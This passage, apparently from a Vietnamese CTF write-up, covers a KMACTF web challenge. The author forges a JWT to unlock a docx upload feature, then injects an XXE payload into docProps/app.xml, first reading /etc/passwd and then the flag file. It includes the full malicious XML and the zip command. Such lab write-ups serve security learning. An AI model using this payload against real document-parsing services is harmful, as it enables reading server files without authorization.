</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>ONE FOR ALL
</span></span><span class=line><span class=cl>HALF-COLD HALF-HOT
</span></span><span class=line><span class=cl>EXPLOSION
</span></span><span class=line><span class=cl>ALL FOR ONE
</span></span><span class=line><span class=cl>DARK SHADOW
</span></span><span class=line><span class=cl>CREATION
</span></span><span class=line><span class=cl>HARDENING
</span></span><span class=line><span class=cl>ENGINE
</span></span><span class=line><span class=cl>INVISIBILITY
</span></span><span class=line><span class=cl>FROG
</span></span><span class=line><span class=cl>ANIVOICE
</span></span><span class=line><span class=cl>HACKING
</span></span></code></pre></td></tr></table></div></div><p>Thử đến cái quirk cuối cùng thì mình mới thấy route dashboard có sự khác biệt, và mình cũng để ý là tác giả đã hint để thành quirk này khi trang web đề cập đến người sở hữu quirk HACKING nên liên lạc với họ:<br><img src=https://hackmd.io/_uploads/ByJ25hts0.png loading=lazy alt=image><br>Forge một jwt mới, và giao diện lúc này đã thay đổi, cho phép ta được upload file docx:<br><img src=https://hackmd.io/_uploads/SyGi5htiR.png loading=lazy alt=image><br><br><img src=https://hackmd.io/_uploads/ry2p53YjC.png loading=lazy alt=image><br></p><h3 id=from-docx-to-xxe>From docx to XXE</h3><p>Đầu tiên mình gửi một file docx valid thì chương trình sẽ đếm số lượng word có trong doc để hiển thị ra ngoài:<br><img src=https://hackmd.io/_uploads/HkdQn2FiA.png loading=lazy alt=image><br>Đi mò mẫm các file xml có dùng để khai thác thì em tìm được write up này: <a class=link href=https://ctftime.org/writeup/24895 target=_blank rel=noopener>https://ctftime.org/writeup/24895</a>, trong 1 file word sẽ tồn tại các file xml và thư mục sau:<br><img src=https://hackmd.io/_uploads/ryDhu6KsR.png loading=lazy alt=image><br>Như vậy ta có thể thấy file word thực chất là tổng hợp của nhiều file xml, nên mình có thể chèn file xml vào trong file docx để thực thi XXE.
Trong writeup mình tham khảo thì họ sử dụng file docProps/app.xml chứa các thông số về file word, cụ thể như số dòng, số chữ, số trang,&mldr; của file docx đó để inject vào số mà website show ra -> đó là số chữ (words)</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34; standalone=&#34;yes&#34;?&gt;
</span></span><span class=line><span class=cl>&lt;!DOCTYPE foo [ 
</span></span><span class=line><span class=cl>    &lt;!ELEMENT foo ANY &gt;
</span></span><span class=line><span class=cl>&lt;!ENTITY xxe SYSTEM &#34;file:///etc/passwd&#34; &gt;]&gt;
</span></span><span class=line><span class=cl>&lt;Properties
</span></span><span class=line><span class=cl>	xmlns=&#34;http://schemas.openxmlformats.org/officeDocument/2006/extended-properties&#34;
</span></span><span class=line><span class=cl>	xmlns:vt=&#34;http://schemas.openxmlformats.org/officeDocument/2006/docPropsVTypes&#34;&gt;
</span></span><span class=line><span class=cl>	&lt;Template&gt;Normal.dotm&lt;/Template&gt;
</span></span><span class=line><span class=cl>	&lt;TotalTime&gt;0&lt;/TotalTime&gt;
</span></span><span class=line><span class=cl>	&lt;Pages&gt;1&lt;/Pages&gt;
</span></span><span class=line><span class=cl>	&lt;Words&gt;&amp;xxe;&lt;/Words&gt;
</span></span><span class=line><span class=cl>	&lt;Characters&gt;4&lt;/Characters&gt;
</span></span><span class=line><span class=cl>	&lt;Application&gt;Microsoft Office Word&lt;/Application&gt;
</span></span><span class=line><span class=cl>	&lt;DocSecurity&gt;0&lt;/DocSecurity&gt;
</span></span><span class=line><span class=cl>	&lt;Lines&gt;100&lt;/Lines&gt;
</span></span><span class=line><span class=cl>	&lt;Paragraphs&gt;1&lt;/Paragraphs&gt;
</span></span><span class=line><span class=cl>	&lt;ScaleCrop&gt;false&lt;/ScaleCrop&gt;
</span></span><span class=line><span class=cl>	&lt;Company&gt;Reply&lt;/Company&gt;
</span></span><span class=line><span class=cl>	&lt;LinksUpToDate&gt;false&lt;/LinksUpToDate&gt;
</span></span><span class=line><span class=cl>	&lt;CharactersWithSpaces&gt;4000&lt;/CharactersWithSpaces&gt;
</span></span><span class=line><span class=cl>	&lt;SharedDoc&gt;false&lt;/SharedDoc&gt;
</span></span><span class=line><span class=cl>	&lt;HyperlinksChanged&gt;false&lt;/HyperlinksChanged&gt;
</span></span><span class=line><span class=cl>	&lt;AppVersion&gt;16.0000&lt;/AppVersion&gt;
</span></span><span class=line><span class=cl>&lt;/Properties&gt;
</span></span></code></pre></td></tr></table></div></div><p>Tiến hành zip file xml này vào file docx bằng command:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>zip a1.docx docProps/app.xml
</span></span></code></pre></td></tr></table></div></div><p><br><img src=https://hackmd.io/_uploads/BJGwtaYoA.png loading=lazy alt=image><br>Nội dung file đã hiện ra ở website<br><img src=https://hackmd.io/_uploads/H10YYTFiC.png loading=lazy alt=image><br>Mình sẽ đọc flag bằng <code>file:///flag.txt</code><br><img src=https://hackmd.io/_uploads/rkvCK6KiC.png loading=lazy alt=image><br>Upload file docx và mình đã có được flag:<br><img src=https://hackmd.io/_uploads/H1Qb5aYj0.png loading=lazy alt=image><br></p><ul><li>Flag: <strong>KMACTF{3cd54_n0nc3_r3u53_4774ck_4nd_xx3_up104d}</strong></li></ul></section><footer class=article-footer><section class=article-tags><a href=/tags/ctf/>CTF</a></section><section class=article-copyright><svg class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><path d="M14.5 9a3.5 4 0 100 6"/></svg>
<span>Licensed under CC BY-NC-SA 4.0</span></section></footer></article><div class=disqus-container><div id=disqus_thread></div><script>window.disqus_config=function(){},function(){if(["localhost","127.0.0.1"].indexOf(window.location.hostname)!=-1){document.getElementById("disqus_thread").innerHTML="Disqus comments not available by default when the website is previewed locally.";return}var t=document,e=t.createElement("script");e.async=!0,e.src="//hugo-theme-stack.disqus.com/embed.js",e.setAttribute("data-timestamp",+new Date),(t.head||t.body).appendChild(e)}()</script><noscript>Please enable JavaScript to view the <a href=https://disqus.com/?ref_noscript>comments powered by Disqus.</a></noscript><a href=https://disqus.com class=dsq-brlink>comments powered by <span class=logo-disqus>Disqus</span></a></div><style>.disqus-container{background-color:var(--card-background);border-radius:var(--card-border-radius);box-shadow:var(--shadow-l1);padding:var(--card-padding)}</style><script>window.addEventListener("onColorSchemeChange",e=>{typeof DISQUS=="object"&&DISQUS.reset({reload:!0})})</script><footer class=site-footer><section class=copyright>&copy;
2020 -
2026 kev1n's Blog</section><section class=powerby>Built with <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a><br>Theme <b><a href=https://github.com/CaiJimmy/hugo-theme-stack target=_blank rel=noopener data-version=3.33.0>Stack</a></b> designed by <a href=https://jimmycai.com target=_blank rel=noopener>Jimmy</a></section></footer><div class=pswp tabindex=-1 role=dialog aria-hidden=true><div class=pswp__bg></div><div class=pswp__scroll-wrap><div class=pswp__container><div class=pswp__item></div><div class=pswp__item></div><div class=pswp__item></div></div><div class="pswp__ui pswp__ui--hidden"><div class=pswp__top-bar><div class=pswp__counter></div><button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
<button class="pswp__button pswp__button--share" title=Share></button>
<button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
<button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button><div class=pswp__preloader><div class=pswp__preloader__icn><div class=pswp__preloader__cut><div class=pswp__preloader__donut></div></div></div></div></div><div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap"><div class=pswp__share-tooltip></div></div><button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
</button>
<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button><div class=pswp__caption><div class=pswp__caption__center></div></div></div></div></div><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo=" crossorigin=anonymous defer></script><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU=" crossorigin=anonymous defer></script><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css crossorigin=anonymous><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css crossorigin=anonymous></main></div><script src=https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z+KMkF24hUW8WePSA9HM=" crossorigin=anonymous></script><script type=text/javascript src=/ts/main.c922af694cc257bf1ecc41c0dd7b0430f9114ec280ccf67cd2c6ad55f5316c4e.js defer></script><script>(function(){const e=document.createElement("link");e.href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap",e.type="text/css",e.rel="stylesheet",document.head.appendChild(e)})()</script></body></html>